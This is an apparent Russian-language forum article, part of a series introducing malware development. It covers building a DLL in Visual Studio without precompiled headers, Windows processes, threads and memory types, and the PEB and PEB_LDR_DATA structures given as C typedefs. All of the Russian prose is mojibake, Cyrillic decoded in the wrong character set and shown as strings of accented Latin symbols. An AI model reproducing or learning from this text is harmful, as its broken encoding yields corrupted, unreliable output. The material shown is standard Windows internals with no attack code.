–ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π —à–∞–±–ª–æ–Ω DLL –ø–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Å framework.h, pch.h –∏ pch.cpp, –∫–æ—Ç–æ—Ä—ã–µ –∏–∑–≤–µ—Å—Ç–Ω—ã –∫–∞–∫ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏. –≠—Ç–∏ —Ñ–∞–π–ª—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø—Ä–æ–µ–∫—Ç–∞ –¥–ª—è –±–æ–ª—å—à–∏—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤. –í—Ä—è–¥ –ª–∏ –æ–Ω–∏ –ø–æ–Ω–∞–¥–æ–±—è—Ç—Å—è –≤ —ç—Ç–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏, –ø–æ—ç—Ç–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —É–¥–∞–ª–∏—Ç—å —ç—Ç–∏ —Ñ–∞–π–ª—ã. –î–ª—è —ç—Ç–æ–≥–æ –≤—ã–¥–µ–ª–∏—Ç–µ —Ñ–∞–π–ª –∏ –Ω–∞–∂–º–∏—Ç–µ –∫–ª–∞–≤–∏—à—É —É–¥–∞–ª–µ–Ω–∏—è, –∑–∞—Ç–µ–º –≤—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é &quot;–£–¥–∞–ª–∏—Ç—å&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731913819.png"
		data-src="https://osint42.org/attachments/1746731913819-png.48/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731913819-png.48/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731913819.png"
			title="1746731913819.png"
			width="1341" height="367" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731921748.png"
		data-src="https://osint42.org/attachments/1746731921748-png.49/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731921748-png.49/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731921748.png"
			title="1746731921748.png"
			width="642" height="367" loading="lazy" />
	</div><br />
<br />
–ü–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏–∑–º–µ–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, —á—Ç–æ–±—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –≤ –ø—Ä–æ–µ–∫—Ç–µ –Ω–µ —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731928464.png"
		data-src="https://osint42.org/attachments/1746731928464-png.50/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731928464-png.50/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731928464.png"
			title="1746731928464.png"
			width="653" height="547" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731936006.png"
		data-src="https://osint42.org/attachments/1746731936006-png.51/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731936006-png.51/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731936006.png"
			title="1746731936006.png"
			width="1165" height="535" loading="lazy" />
	</div><br />
<br />
–ü–µ—Ä–µ–π–¥–∏—Ç–µ –∫ –≤–∫–ª–∞–¥–∫–µ C/C++.<br />
<br />
–ò–∑–º–µ–Ω–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä &quot;–ü—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫&quot; –Ω–∞ &quot;–ù–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏&quot;–∏ –Ω–∞–∂–º–∏—Ç–µ &quot;–ü—Ä–∏–º–µ–Ω–∏—Ç—å&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731943698.png"
		data-src="https://osint42.org/attachments/1746731943698-png.52/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731943698-png.52/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731943698.png"
			title="1746731943698.png"
			width="962" height="563" loading="lazy" />
	</div><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å —Ñ–∞–π–ª dllmain.cpp –Ω–∞ dllmain.c. –≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ, –µ—Å–ª–∏ –≤—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ C –≤–º–µ—Å—Ç–æ C++. –î–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤—ã–±–µ—Ä–∏—Ç–µ –°–±–æ—Ä–∫–∞ &gt; –°–æ–±—Ä–∞—Ç—å —Ä–µ—à–µ–Ω–∏–µ, –∏ DLL –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –≤ –ø–∞–ø–∫–µ Release –∏–ª–∏ Debug, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.</div>
						

							<h2>–ü—Ä–æ—Ü–µ—Å—Å—ã Windows</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732086378.png"
		data-src="https://osint42.org/attachments/1746732086378-png.53/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732086378-png.53/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732086378.png"
			title="1746732086378.png"
			width="786" height="537" loading="lazy" />
	</div><br />
<br />
–í –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –≤–µ—Ä—Å–∏—è—Ö —Å—Ç–∞—Ç–µ–π, –±—ã–ª–æ –æ—á–µ–Ω—å –∫—Ä–∞—Ç–∫–æ–µ –æ–∑–Ω–∞–∫–æ–º–ª–µ–Ω–∏–µ –∫–∞–∫–∏—Ö-—Ç–æ –±–∞–∑–æ–≤—ã—Ö –≤–µ—â–µ–π, –±–µ–∑ –∫–æ—Ç–æ—Ä—ã—Ö –≤–æ–æ–±—â–µ –ø—Ä–æ–±–ª–µ–º–∞—Ç–∏—á–Ω–æ –≤–µ—Å—Ç–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É.<br />
–ü–æ–Ω—è—Ç–Ω–æ —á—Ç–æ —ç—Ç–æ–≥–æ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ, –Ω–æ –∫–∞–∫–æ–µ-—Ç–æ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–æ–∂–µ—Ç –¥–∞—Ç—å.<br />
<br />
–î—É–º–∞—é —ç—Ç–æ –ø–æ—Å–ª–µ–¥–Ω—è—è —Å—Ç–∞—Ç—å—è, –ø–æ —Ç–µ–æ—Ä–∏–∏ –∏ —Å–ª–µ–¥—É—é—â–∏–µ —Å—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç —É–∂–µ –ø—Ä–µ–¥–º–µ—Ç–Ω—ã–µ, –ø–æ—Å–≤—è—â–µ–Ω–Ω—ã–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ –º–∞–ª–≤–∞—Ä–∏...<br />
<br />
<b>–ß—Ç–æ —Ç–∞–∫–æ–µ –ø—Ä–æ—Ü–µ—Å—Å Windows?<br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å Windows </b>- —ç—Ç–æ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –≤—ã–ø–æ–ª–Ω—è—é—â–µ–µ—Å—è –Ω–∞ –º–∞—à–∏–Ω–µ —Å Windows. –ü—Ä–æ—Ü–µ—Å—Å –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–ø—É—â–µ–Ω –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —Ç–∞–∫ –∏ —Å–∞–º–æ–π —Å–∏—Å—Ç–µ–º–æ–π. –ü—Ä–æ—Ü–µ—Å—Å –ø–æ—Ç—Ä–µ–±–ª—è–µ—Ç —Ä–µ—Å—É—Ä—Å—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ –ø–∞–º—è—Ç—å, –¥–∏—Å–∫–æ–≤–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –∏ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω–æ–µ –≤—Ä–µ–º—è, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–¥–∞—á—É.<br />
<br />
<b>–ü–æ—Ç–æ–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å—ã Windows —Å–æ—Å—Ç–æ—è—Ç –∏–∑ –æ–¥–Ω–æ–≥–æ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ—Ç–æ–∫–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ. –ü–æ—Ç–æ–∫ ‚Äî —ç—Ç–æ –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –≤ —Ä–∞–º–∫–∞—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞. –ü–æ—Ç–æ–∫–∏ –≤–Ω—É—Ç—Ä–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –º–æ–≥—É—Ç –æ–±–º–µ–Ω–∏–≤–∞—Ç—å—Å—è –¥–∞–Ω–Ω—ã–º–∏. –ü–æ—Ç–æ–∫–∏ –ø–ª–∞–Ω–∏—Ä—É—é—Ç—Å—è –∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –∏ —É–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>–ü–∞–º—è—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å—ã Windows —Ç–∞–∫–∂–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –ø–∞–º—è—Ç—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π. –ü–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ—Ç—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø—Ä–∏ –µ–≥–æ —Å–æ–∑–¥–∞–Ω–∏–∏, –∏ –æ–±—ä–µ–º –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏ –º–æ–∂–µ—Ç —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å—Å—è —Å–∞–º–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª—è–µ—Ç –ø–∞–º—è—Ç—å—é —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –∏ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏. –í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ–ª—å—à–µ –ø–∞–º—è—Ç–∏, —á–µ–º —Ñ–∏–∑–∏—á–µ—Å–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–æ, —Å–æ–∑–¥–∞–≤–∞—è –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–µ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–Ω–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º. –≠—Ç–∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–Ω—ã–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ —Ä–∞–∑–¥–µ–ª–µ–Ω—ã –Ω–∞ &quot;—Å—Ç—Ä–∞–Ω–∏—Ü—ã&quot;, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞—Ç–µ–º –≤—ã–¥–µ–ª—è—é—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å–∞–º.<br />
<br />
<b>–¢–∏–ø—ã –ø–∞–º—è—Ç–∏</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å—ã –º–æ–≥—É—Ç –∏–º–µ—Ç—å —Ä–∞–∑–Ω—ã–µ —Ç–∏–ø—ã –ø–∞–º—è—Ç–∏:<br />
<ul>
<li data-xf-list-type="ul">–ü—Ä–∏–≤–∞—Ç–Ω–∞—è –ø–∞–º—è—Ç—å –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–¥–µ–ª–µ–Ω–∞ —Å –¥—Ä—É–≥–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏. –≠—Ç–æ—Ç —Ç–∏–ø –ø–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">–û—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –º–æ–∂–µ—Ç –±—ã—Ç—å —Ä–∞–∑–¥–µ–ª–µ–Ω–∞ –º–µ–∂–¥—É –¥–≤—É–º—è –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏. –û–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±–º–µ–Ω–∞ –¥–∞–Ω–Ω—ã–º–∏ –º–µ–∂–¥—É –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, –æ–±—â–∏–º–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞–º–∏, –æ–±—â–∏–º–∏ —Å–µ–≥–º–µ–Ω—Ç–∞–º–∏ –ø–∞–º—è—Ç–∏ –∏ –æ–±—â–∏–º–∏ —Ñ–∞–π–ª–∞–º–∏. –û—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –≤–∏–¥–∏–º–∞ –¥–ª—è –¥—Ä—É–≥–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –Ω–æ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π –¥—Ä—É–≥–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏.</li>
<li data-xf-list-type="ul">–ü–∞–º—è—Ç—å –æ–±—Ä–∞–∑–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –∫–æ–¥ –∏ –¥–∞–Ω–Ω—ã–µ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞. –û–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –∏ –¥–∞–Ω–Ω—ã—Ö, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–º, —Ç–∞–∫–∏—Ö –∫–∞–∫ –∫–æ–¥ –ø—Ä–æ–≥—Ä–∞–º–º—ã, –¥–∞–Ω–Ω—ã–µ –∏ —Ä–µ—Å—É—Ä—Å—ã. –ü–∞–º—è—Ç—å –æ–±—Ä–∞–∑–∞ —á–∞—Å—Ç–æ —Å–≤—è–∑–∞–Ω–∞ —Å —Ñ–∞–π–ª–∞–º–∏ DLL, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–º–∏ –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ul><b>Process Environment Block (PEB)<br />
<br />
Process Environment Block (PEB)</b> - —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Windows, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–µ, —Ç–∞–∫—É—é –∫–∞–∫ –µ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∑–∞–ø—É—Å–∫–µ, –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –∫—É—á–µ, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ DLL –∏ –¥—Ä—É–≥–æ–µ. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö –∏ –∑–∞–≥—Ä—É–∑—á–∏–∫–æ–º Windows –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –¢–∞–∫–∂–µ –æ–Ω —Ö—Ä–∞–Ω–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–µ, —Ç–∞–∫—É—é –∫–∞–∫ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (PID) –∏ –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É.<br />
<br />
–ö–∞–∂–¥—ã–π —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∏–º–µ–µ—Ç —Å–≤–æ—é —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–∞–Ω–Ω—ã—Ö PEB, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –Ω–∞–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –Ω–µ–º.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB –≤ C –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ. –ó–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —á–ª–µ–Ω—ã —ç—Ç–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –º–æ–∂–Ω–æ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞—Ç—å.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, *PPEB;</code></pre>
	</div>
</div><br />
–ù–µ–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —á–ª–µ–Ω—ã –æ–±—ä—è—Å–Ω—è—é—Ç—Å—è –Ω–∏–∂–µ.<br />
<br />
<b>BeingDebugged</b><br />
<br />
BeingDebugged - —ç—Ç–æ —Ñ–ª–∞–≥ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ PEB, –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç, –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å –∏–ª–∏ –Ω–µ—Ç. –û–Ω —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ 1 (TRUE), –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è, –∏ 0 (FALSE), –∫–æ–≥–¥–∞ –æ–Ω –Ω–µ –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑—á–∏–∫–æ–º Windows –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, —Å–ª–µ–¥—É–µ—Ç –ª–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–º –æ—Ç–ª–∞–¥—á–∏–∫–æ–º –∏–ª–∏ –Ω–µ—Ç.<br />
<br />
<b>Ldr</b><br />
<br />
Ldr - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB_LDR_DATA –≤ PEB. –≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–æ–¥—É–ª—è—Ö –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ (DLL) –ø—Ä–æ—Ü–µ—Å—Å–∞. –û–Ω–∞ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è —Å–ø–∏—Å–æ–∫ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –≤ –ø—Ä–æ—Ü–µ—Å—Å DLL, –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∫–∞–∂–¥–æ–π DLL –∏ —Ä–∞–∑–º–µ—Ä –∫–∞–∂–¥–æ–≥–æ –º–æ–¥—É–ª—è. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑—á–∏–∫–æ–º Windows –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –≤ –ø—Ä–æ—Ü–µ—Å—Å DLL. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB_LDR_DATA –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre>
	</div>
</div><br />
